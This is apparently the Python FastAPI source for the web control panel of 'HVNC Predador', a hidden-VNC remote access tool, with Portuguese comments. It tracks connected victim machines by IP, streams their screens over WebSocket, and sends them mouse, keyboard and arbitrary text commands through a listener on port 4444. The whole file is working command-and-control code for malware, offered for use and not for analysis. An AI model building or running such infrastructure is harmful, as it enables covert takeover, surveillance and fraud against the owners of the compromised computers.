#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HVNC Predador - Web Interface
Interface web para controle do HVNC
"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
import json
import base64
import logging
from typing import Dict, List, Optional
from datetime import datetime
import socket
import io
from PIL import Image
import uvicorn
from pathlib import Path

from config import Config
from integration import start_integration, get_integration_server

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="HVNC Predador Web Panel", version="2.0.0")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Gerenciamento de conexões
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
        self.clients: Dict[str, dict] = {}
        self.client_sockets: Dict[str, socket.socket] = {}
        
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        logger.info(f"Nova conexão WebSocket estabelecida. Total: {len(self.active_connections)}")
        
    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
        logger.info(f"Conexão WebSocket encerrada. Total: {len(self.active_connections)}")
        
    async def send_personal_message(self, message: str, websocket: WebSocket):
        try:
            await websocket.send_text(message)
        except Exception as e:
            logger.error(f"Erro ao enviar mensagem: {e}")
            
    async def broadcast(self, message: str):
        disconnected = []
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except Exception as e:
                logger.error(f"Erro ao fazer broadcast: {e}")
                disconnected.append(connection)
        
        # Remove conexões mortas
        for conn in disconnected:
            self.disconnect(conn)
            
    def add_client(self, client_id: str, client_info: dict):
        self.clients[client_id] = {
            **client_info,
            'connected_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'online'
        }
        
    def remove_client(self, client_id: str):
        if client_id in self.clients:
            self.clients[client_id]['status'] = 'offline'
            self.clients[client_id]['disconnected_at'] = datetime.now().isoformat()
            
    def update_client_screen(self, client_id: str, screen_data: str):
        if client_id in self.clients:
            self.clients[client_id]['last_screen'] = screen_data
            self.clients[client_id]['last_seen'] = datetime.now().isoformat()

manager = ConnectionManager()

# Servidor HVNC será gerenciado pelo integration.py
# Mantendo apenas referências para compatibilidade
class HVNCServer:
    """Wrapper para o servidor de integração"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.config = Config()
        self.integration_server = None
        
    def start(self):
        """Inicia o servidor HVNC via integration"""
        try:
            self.integration_server = start_integration(self.config)
            
            # Registrar callbacks após inicialização
            if self.integration_server:
                self.integration_server.add_client_callback(client_change_callback)
                self.integration_server.add_screen_callback(screen_update_callback)
                logger.info("Callbacks de cliente e tela registrados no servidor de integração")
            
            logger.info(f"Servidor HVNC iniciado via integração")
        except Exception as e:
            logger.error(f"Erro ao iniciar servidor HVNC: {e}")
            raise
            
    def get_clients(self):
        """Retorna lista de clientes conectados"""
        logger.info(f"Integration server: {self.integration_server}")
        if self.integration_server:
            clients = self.integration_server.get_all_clients()
            logger.info(f"Clientes encontrados: {clients}")
            return clients
        logger.warning("Integration server não encontrado!")
        return {}
        
    def send_command(self, client_id: str, command: str) -> bool:
        """Envia comando para cliente específico"""
        if self.integration_server:
            return self.integration_server.send_command_to_client(client_id, command)
        return False
            
    def stop(self):
        """Para o servidor"""
        if self.integration_server:
            self.integration_server.stop()

# Instância do servidor HVNC
hvnc_server = HVNCServer()

# Callback para sincronizar clientes com WebSocket
def client_change_callback(event_type: str, client_id: str, client_data: dict = None):
    """Callback para notificar WebSocket sobre mudanças nos clientes"""
    try:
        logger.info(f"Cliente {event_type}: {client_id}")
        
        if event_type == 'connected':
            # Adicionar cliente ao manager
            formatted_client = {
                'ip': client_data.get('ip', client_id.split(':')[0] if ':' in client_id else client_id),
                'port': client_data.get('port', client_id.split(':')[1] if ':' in client_id else 'N/A'),
                'status': 'online',
                'connected_at': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat()
            }
            manager.add_client(client_id, formatted_client)
            
            # Notificar via WebSocket
            message = json.dumps({
                'type': 'client_connected',
                'client_id': client_id,
                'client_data': formatted_client
            })
            
            # Usar asyncio.run para executar em contexto assíncrono
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # Se já há um loop rodando, agendar a tarefa
                    loop.create_task(manager.broadcast(message))
                else:
                    # Se não há loop, criar um novo
                    asyncio.run(manager.broadcast(message))
            except RuntimeError:
                # Fallback: usar thread para executar broadcast
                import threading
                def run_broadcast():
                    asyncio.run(manager.broadcast(message))
                threading.Thread(target=run_broadcast, daemon=True).start()
            
        elif event_type == 'disconnected':
            # Remover cliente do manager
            manager.remove_client(client_id)
            
            # Notificar via WebSocket
            message = json.dumps({
                'type': 'client_disconnected',
                'client_id': client_id
            })
            
            # Usar asyncio.run para executar em contexto assíncrono
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # Se já há um loop rodando, agendar a tarefa
                    loop.create_task(manager.broadcast(message))
                else:
                    # Se não há loop, criar um novo
                    asyncio.run(manager.broadcast(message))
            except RuntimeError:
                # Fallback: usar thread para executar broadcast
                import threading
                def run_broadcast():
                    asyncio.run(manager.broadcast(message))
                threading.Thread(target=run_broadcast, daemon=True).start()
            
    except Exception as e:
        logger.error(f"Erro no callback de mudança de cliente: {e}")

def screen_update_callback(client_id: str, screen_data: dict):
    """Callback para transmitir atualizações de tela via WebSocket"""
    try:
        import json
        # Converter dict para JSON string antes do broadcast
        message = json.dumps(screen_data)
        
        # Broadcast da atualização de tela para todos os clientes WebSocket
        try:
            # Tentar usar loop de eventos atual
            loop = asyncio.get_event_loop()
            if loop.is_running():
                asyncio.create_task(manager.broadcast(message))
            else:
                asyncio.run(manager.broadcast(message))
        except RuntimeError:
            # Fallback: usar thread para executar broadcast
            import threading
            def run_broadcast():
                asyncio.run(manager.broadcast(message))
            threading.Thread(target=run_broadcast, daemon=True).start()
        
        logger.info(f"Atualização de tela para cliente {client_id} transmitida via WebSocket: {len(screen_data.get('image_data', ''))} bytes")
        
    except Exception as e:
        logger.error(f"Erro no callback de atualização de tela: {e}")

# Callback será registrado após inicialização do servidor no método start()

# Processamento de comandos
async def process_client_command(client_id: str, command: dict) -> bool:
    """Processa comandos enviados para clientes específicos"""
    try:
        command_type = command.get('type', '')
        
        if command_type == 'mouse':
            return await process_mouse_command(client_id, command)
        elif command_type == 'keyboard':
            return await process_keyboard_command(client_id, command)
        else:
            # Comando de texto simples
            cmd_str = command if isinstance(command, str) else command.get('command', '')
            return hvnc_server.send_command(client_id, cmd_str)
            
    except Exception as e:
        logger.error(f"Erro ao processar comando: {e}")
        return False

async def process_mouse_command(client_id: str, command: dict) -> bool:
    """Processa comandos de mouse"""
    try:
        action = command.get('action', '')
        x = command.get('x', 0)
        y = command.get('y', 0)
        button = command.get('button', 'left')
        delta = command.get('delta', 0)
        
        # Formata comando de mouse para o cliente C++
        if action == 'mousemove':
            cmd = f"MOUSE_MOVE:{x}:{y}"
        elif action == 'mousedown':
            cmd = f"MOUSE_DOWN:{x}:{y}:{button.upper()}"
        elif action == 'mouseup':
            cmd = f"MOUSE_UP:{x}:{y}:{button.upper()}"
        elif action == 'scroll':
            cmd = f"MOUSE_SCROLL:{x}:{y}:{delta}"
        else:
            return False
            
        logger.info(f"Enviando comando de mouse para {client_id}: {cmd}")
        return hvnc_server.send_command(client_id, cmd)
        
    except Exception as e:
        logger.error(f"Erro ao processar comando de mouse: {e}")
        return False

async def process_keyboard_command(client_id: str, command: dict) -> bool:
    """Processa comandos de teclado"""
    try:
        action = command.get('action', '')
        key = command.get('key', '')
        key_code = command.get('keyCode', 0)
        
        # Formata comando de teclado para o cliente C++
        if action == 'keydown':
            cmd = f"KEY_DOWN:{key_code}:{key}"
        elif action == 'keyup':
            cmd = f"KEY_UP:{key_code}:{key}"
        else:
            return False
            
        logger.info(f"Enviando comando de teclado para {client_id}: {cmd}")
        return hvnc_server.send_command(client_id, cmd)
        
    except Exception as e:
        logger.error(f"Erro ao processar comando de teclado: {e}")
        return False

# Rotas da API
@app.get("/")
async def get_dashboard():
    return FileResponse("web/static/index.html")

@app.get("/api/clients")
async def get_clients():
    """Retorna lista de clientes conectados"""
    clients = hvnc_server.get_clients()
    return {
        "clients": clients,
        "total": len(clients)
    }

@app.get("/api/clients/{client_id}")
async def get_client(client_id: str):
    """Retorna informações de um cliente específico"""
    if client_id not in manager.clients:
        raise HTTPException(status_code=404, detail="Cliente não encontrado")
    return manager.clients[client_id]

@app.post("/api/clients/{client_id}/command")
async def send_command(client_id: str, command: dict):
    """Envia comando para um cliente específico"""
    try:
        cmd = command.get('command', '')
        
        # Envia comando via servidor de integração
        success = hvnc_server.send_command(client_id, cmd)
        
        if success:
            return {
                "success": True,
                "message": f"Comando '{cmd}' enviado para {client_id}"
            }
        else:
            raise HTTPException(status_code=404, detail="Cliente não encontrado ou erro no envio")
            
    except Exception as e:
        logger.error(f"Erro ao enviar comando: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        # Envia estado inicial com clientes reais do servidor de integração
        real_clients = hvnc_server.get_clients()
        logger.info(f"Enviando estado inicial com {len(real_clients)} clientes: {list(real_clients.keys())}")
        
        # Converte formato dos clientes para o painel web
        formatted_clients = {}
        for client_id, client_data in real_clients.items():
            formatted_clients[client_id] = {
                'ip': client_data.get('ip', client_id.split(':')[0] if ':' in client_id else client_id),
                'port': client_data.get('port', client_id.split(':')[1] if ':' in client_id else 'N/A'),
                'status': 'online',
                'connected_at': client_data.get('connected_at', datetime.now().isoformat()),
                'last_seen': client_data.get('last_seen', datetime.now().isoformat())
            }
        
        await manager.send_personal_message(json.dumps({
            'type': 'initial_state',
            'clients': formatted_clients
        }), websocket)
        
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            if message['type'] == 'send_command':
                client_id = message['client_id']
                command = message['command']
                
                # Processa diferentes tipos de comando
                success = await process_client_command(client_id, command)
                
                if success:
                    await manager.send_personal_message(json.dumps({
                        'type': 'command_sent',
                        'client_id': client_id,
                        'command': command
                    }), websocket)
                else:
                    await manager.send_personal_message(json.dumps({
                        'type': 'error',
                        'message': f'Erro ao enviar comando para cliente {client_id}'
                    }), websocket)
                        
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# Monta arquivos estáticos
app.mount("/static", StaticFiles(directory="web/static"), name="static")

# Servidor HVNC será iniciado pelo run.py - removendo duplicação
@app.on_event("startup")
async def startup_event():
    # Servidor HVNC já foi iniciado pelo run.py
    logger.info("Aplicação web iniciada com sucesso!")

@app.on_event("shutdown")
async def shutdown_event():
    hvnc_server.stop()
    logger.info("Aplicação web encerrada")

if __name__ == "__main__":
    uvicorn.run(
        "app:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="info"
    )